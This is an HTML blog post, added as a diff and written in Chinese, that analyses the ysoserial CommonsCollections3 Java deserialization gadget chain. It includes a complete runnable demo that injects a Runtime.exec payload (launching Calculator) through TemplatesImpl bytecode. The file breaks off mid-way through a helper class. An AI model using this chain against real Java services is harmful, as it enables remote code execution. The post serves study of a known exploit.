@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="ysoserial分析之CommonsCollections1 在分析完CommonsCollections1之后，紧接着分析了CommonsCollections3。为什么是3呢？因为3和1都是需要JDK1.7版本，而且payload构造的前半部分完全一样，不同的只是chainedTransformer的构造。 CommonsCollections3从外层和CommonsCollections1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ysoerial分析之CommonsCollections3">
+<meta property="og:url" content="http://yoursite.com/2020/04/22/ysoerial-analysis-3/index.html">
+<meta property="og:site_name" content="Ananaskr&#39;s Blog">
+<meta property="og:description" content="ysoserial分析之CommonsCollections1 在分析完CommonsCollections1之后，紧接着分析了CommonsCollections3。为什么是3呢？因为3和1都是需要JDK1.7版本，而且payload构造的前半部分完全一样，不同的只是chainedTransformer的构造。 CommonsCollections3从外层和CommonsCollections1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/04/22/ysoerial-analysis-3/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/22/ysoerial-analysis-3/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/22/ysoerial-analysis-3/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/22/ysoerial-analysis-3/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/22/ysoerial-analysis-3/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/22/ysoerial-analysis-3/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/22/ysoerial-analysis-3/7.jpeg">
+<meta property="article:published_time" content="2020-04-22T10:06:47.000Z">
+<meta property="article:modified_time" content="2020-04-23T14:10:16.644Z">
+<meta property="article:author" content="ananaskr">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/04/22/ysoerial-analysis-3/1.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/04/22/ysoerial-analysis-3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>ysoerial分析之CommonsCollections3 | Ananaskr's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ananaskr's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/22/ysoerial-analysis-3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ananaskr">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ananaskr's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ysoerial分析之CommonsCollections3
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-04-22 18:06:47" itemprop="dateCreated datePublished" datetime="2020-04-22T18:06:47+08:00">2020-04-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-04-23 22:10:16" itemprop="dateModified" datetime="2020-04-23T22:10:16+08:00">2020-04-23</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a></p>
+<p>在分析完CommonsCollections1之后，紧接着分析了CommonsCollections3。为什么是3呢？因为3和1都是需要JDK1.7版本，而且payload构造的前半部分完全一样，不同的只是chainedTransformer的构造。</p>
+<p>CommonsCollections3从外层和CommonsCollections1一样都是从AnnotationInvocationHandler的readObject函数进入的。进入之后调用到了LazyMap.get()方法，从而调用到ChainedTranformer.transform()方法。</p>
+<p>之前的CommonsCollections1使用的是InvokerTransformer的transform，因为该函数实现了反射调用任意类的功能。而CommonsCollection3使用的是新的Transformer类<code>InstantiateTransformer</code>类。该类有什么作用呢？接下来会对其进行分析。</p>
+<h2 id="InstantiateTransformer类分析"><a href="#InstantiateTransformer类分析" class="headerlink" title="InstantiateTransformer类分析"></a>InstantiateTransformer类分析</h2><p>首先看到InstantiateTransformer类的<code>tranform</code>方法，它会对当前传入的类进行实例化，那么传入哪个类呢？</p>
+<p><img src="1.png" alt=""></p>
+<p>这里就要引入<code>TrAFilter</code>类，在Payload中使用的此类的实例化，在其构造函数中可以看到它调用了<code>templates.newTransformer()</code>，templates是实例化时传入的参数<code>this.iArgs</code>，可以看到它是一个<code>Templates</code>类。</p>
+<p><img src="2.png" alt=""></p>
+<p>跟进这个newTransformer()函数，可以发现它实例化了一个TransformerImpl类，在其中调用了<code>getTransletInstance()</code>函数，跟进这个函数。</p>
+<p><img src="3.png" alt=""></p>
+<p>跟进这个函数后，可以看到它经过2个判断后，会调用到<code>defineTransletClasses()</code>函数。调用完这个函数后，在其后对<code>_class[_transletIndex]</code>这个类进行实例化，生成了AbstractTranslet对象。最后返回这个对象。</p>
+<p><img src="4.png" alt=""></p>
+<p>若<code>_class[_transletIndex]</code>的构造方法或者静态块中存在可控的命令执行，那么就会产生RCE。接下来跟进<code>defineTransletClasses()</code>函数。</p>
+<p><img src="5.png" alt=""></p>
+<p>首先会实例化一个loader，然后调用<code>defineClass()</code>函数，跟进一步可以发现，它实际上调用的是ClassLoader类的defineClass()函数。这个函数的作用是从byte数组中恢复一个Class。这是ClassLoader从byte数组中还原Class的方法。若<code>_bytecodes</code>是可控的，那么就可以加载任意类，且在后续的实例化中会达到任意命令执行。</p>
+<p><code>_bytecodes</code>是TemplatesImpl对象的一个成员。在一开始<code>TrAFilter</code>实例化时可以传入一个TemplatesImpl对象。所以，整个反序列化的链就出来了。反序列化调用链如下所示:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">	-&gt;Proxy(LazyMap).entrySet()</span><br><span class="line">		-&gt;LazyMap.get()</span><br><span class="line">			-&gt;ChainedTransformer.transform()</span><br><span class="line">				-&gt;constantTransformer(TrAXFilter.class)</span><br><span class="line">					-&gt;InstantiateTransformer.transform()</span><br><span class="line">						-&gt;Constructor.newInstance()</span><br><span class="line">							-&gt;TemplatesImpl.newTransformer()</span><br><span class="line">								-&gt;TemplatesImpl.getTransletInstance()</span><br><span class="line">									-&gt;TemplatesImpl.defineTransletClasses()</span><br><span class="line">										-&gt;AbstractTranslet.newInstance()</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="ChainedTranformer构造"><a href="#ChainedTranformer构造" class="headerlink" title="ChainedTranformer构造"></a>ChainedTranformer构造</h2><p>由分析可知，利用的是<code>TrAxFilter</code>类的实例化函数，首先需要获取到<code>TrAxFilter</code>类。使用ConstantTransformer即可。然后此类在实例化时传入的是TemplatesImpl类，因此InstantiateTranformer的参数为TemplatesImpl。ChainedTransformer链的构造如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformer &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>其中templates为一个特定的TemplatesImpl对象。在上面的分析中可以得知，该对象的<code>_bytecodes</code>值中是能执行命令的恶意类的字节码。恶意类如何构造呢？</p>
+<h3 id="构造恶意类"><a href="#构造恶意类" class="headerlink" title="构造恶意类"></a>构造恶意类</h3><p>在构造恶意类时，ysoserial使用了javassist来对静态块注入任意代码。首先该类必须继承<code>AbstractTranslet</code>，并且能够被反序列化。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static class StubTransletPayload extends AbstractTranslet implements Serializable &#123;</span><br><span class="line">        private static final long serialVersionUID &#x3D; -5971610431559700674L;</span><br><span class="line"></span><br><span class="line">        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException&#123;&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>由于StubTransletPayload继承自抽象类，所以其子类中必须实现transform方法。而且其成员变量必须用final关键字修饰。</p>
+</blockquote>
+<p>然后在通过javassist来向静态块中插入任意代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;定义插入的代码</span><br><span class="line">String command &#x3D; &quot;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;;</span><br><span class="line">String cmd &#x3D; &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +</span><br><span class="line">                command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +</span><br><span class="line">                &quot;\&quot;);&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));</span><br><span class="line">pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span><br><span class="line">CtClass clazz &#x3D; pool.get(StubTransletPayload.class.getName());</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;插入代码</span><br><span class="line">clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;设置其父类</span><br><span class="line">CtClass superC &#x3D; pool.get(AbstractTranslet.class.getName());</span><br><span class="line">clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;将其转化为字节码        </span><br><span class="line">byte[] classBytes &#x3D; clazz.toBytecode();</span><br></pre></td></tr></table></figure>
+
+<p>到此为止，恶意类构造完了，接下来需要的是保证反序列化链中的相应的函数能够被调用到，由于可控的是TemplatesImpl，从与它相关的函数调用分析。在newTransformer()函数中，调用了getTransletInstance()函数，在这之前没有其他分支，进入此函数。首先<code>_name</code>成员变量不能为空，否则直接返回null。其次<code>_class</code>成员变量必须为空才能进入<code>defineTransletClasses()</code>函数。进入此函数，可以看到首先<code>_bytecodes</code>函数不能为空，然后在生成loader对象时，需要对<code>_tfactory</code>成员变量赋值。其次，在从字节码中加载了类之后，会判断其父类必须等同于<code>ABSTRACT_RANSLET</code>。这就是为什么上面的代码中会对其父类进行设置。</p>
+<p>对于TemplatesImpl的其他设置如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;生成一个TemplatesImpl对象</span><br><span class="line">Object templates &#x3D; Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;).newInstance();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;获得TemplatesImpl的成员变量，将_bytecodes设置为此类的bytecode</span><br><span class="line">Field field &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">field.setAccessible(true);</span><br><span class="line">field.set(templates,new byte[][] &#123;classBytes,classFiles.classAsBytes(Foo.class)&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;获得TemplatesImpl的成员变量，将_name设置为任意不为空的值。ysoserial在这里对name设置的是一个随机值，为了重复使用。</span><br><span class="line">Field field2 &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);</span><br><span class="line">field2.setAccessible(true);</span><br><span class="line">field2.set(templates,&quot;ananaskr&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;获得TemplatesImpl的成员变量，设置_tfactory。</span><br><span class="line">Field field3 &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        field3.setAccessible(true);</span><br><span class="line">        field3.set(templates, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>在这里出现了一个Foo.class。事实上_bytecodes是一个byte[][]。需要2个class的字节码，Foo.class就是一个实现了Serializable的空类。<code>public static class Foo implements Serializable {private static final long serialVersionUID = 8207363842866235160L;}</code></p>
+</blockquote>
+<h2 id="完整demo"><a href="#完整demo" class="headerlink" title="完整demo"></a>完整demo</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import javassist.ClassClassPath;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static class StubTransletPayload extends AbstractTranslet implements Serializable &#123;</span><br><span class="line">        private static final long serialVersionUID &#x3D; -5971610431559700674L;</span><br><span class="line"></span><br><span class="line">        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static class Foo implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">        private static final long serialVersionUID &#x3D; 8207363842866235160L;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String command &#x3D; &quot;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;;</span><br><span class="line">        String cmd &#x3D; &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +</span><br><span class="line">                command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +</span><br><span class="line">                &quot;\&quot;);&quot;;</span><br><span class="line"></span><br><span class="line">        Object templates &#x3D; Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;).newInstance();</span><br><span class="line"></span><br><span class="line">        ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));</span><br><span class="line">        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass clazz &#x3D; pool.get(StubTransletPayload.class.getName());</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC &#x3D; pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        byte[] classBytes &#x3D; clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        Field field &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(templates,new byte[][] &#123;classBytes,classFiles.classAsBytes(Foo.class)&#125;);</span><br><span class="line"></span><br><span class="line">        Field field2 &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        field2.setAccessible(true);</span><br><span class="line">        field2.set(templates,&quot;ananaskr12345&quot;);</span><br><span class="line"></span><br><span class="line">        Field field3 &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        field3.setAccessible(true);</span><br><span class="line">        field3.set(templates, TransformerFactoryImpl.class.newInstance());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformer &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformer);</span><br><span class="line"></span><br><span class="line">        Map map &#x3D; new HashMap();</span><br><span class="line">        Map lazyMap &#x3D; LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        ClassLoader loader &#x3D; lazyMap.getClass().getClassLoader();</span><br><span class="line">        Class[] interfaces &#x3D; lazyMap.getClass().getInterfaces();</span><br><span class="line"></span><br><span class="line">        Constructor ctor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        InvocationHandler handler &#x3D; (InvocationHandler) ctor.newInstance(Override.class,lazyMap);</span><br><span class="line"></span><br><span class="line">        Map mapProxy &#x3D; (Map) Proxy.newProxyInstance(loader,interfaces,handler);</span><br><span class="line"></span><br><span class="line">        Constructor cttor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];</span><br><span class="line">        cttor.setAccessible(true);</span><br><span class="line">        InvocationHandler handler1 &#x3D; (InvocationHandler) ctor.newInstance(Override.class,mapProxy);</span><br><span class="line">        </span><br><span class="line">        ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out &#x3D; new ObjectOutputStream(baos);</span><br><span class="line">        out.writeObject(handler1);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        byte[] bytes &#x3D; baos.toByteArray();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bais &#x3D; new ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in &#x3D; new ObjectInputStream(bais);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中对Foo.class转换为bytecode的代码，直接使用了ysoserial中的<code>ClassFiles</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line"></span><br><span class="line">public class classFiles &#123;</span><br><span class="line">    public static String classAsFile(final Class&lt;?&gt; clazz) &#123;</span><br><span class="line">        return classAsFile(clazz, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String classAsFile(final Class&lt;?&gt; clazz, boolean suffix) &#123;</span><br><span class="line">        String str;</span><br><span class="line">        if (clazz.getEnclosingClass() &#x3D;&#x3D; null) &#123;</span><br><span class="line">            str &#x3D; clazz.getName().replace(&quot;.&quot;, &quot;&#x2F;&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            str &#x3D; classAsFile(clazz.getEnclosingClass(), false) + &quot;$&quot; + clazz.getSimpleName();</span><br><span class="line">        &#125;</span><br><span class="line">        if (suffix) &#123;</span><br><span class="line">            str +&#x3D; &quot;.class&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] classAsBytes(final Class&lt;?&gt; clazz) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            final byte[] buffer &#x3D; new byte[1024];</span><br><span class="line">            final String file &#x3D; classAsFile(clazz);</span><br><span class="line">            final InputStream in &#x3D; classFiles.class.getClassLoader().getResourceAsStream(file);</span><br><span class="line">            if (in &#x3D;&#x3D; null) &#123;</span><br><span class="line">                throw new IOException(&quot;couldn&#39;t find &#39;&quot; + file + &quot;&#39;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            final ByteArrayOutputStream out &#x3D; new ByteArrayOutputStream();</span><br><span class="line">            int len;</span><br><span class="line">            while ((len &#x3D; in.read(buffer)) !&#x3D; -1) &#123;</span><br><span class="line">                out.write(buffer, 0, len);</span><br><span class="line">            &#125;</span><br><span class="line">            return out.toByteArray();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span 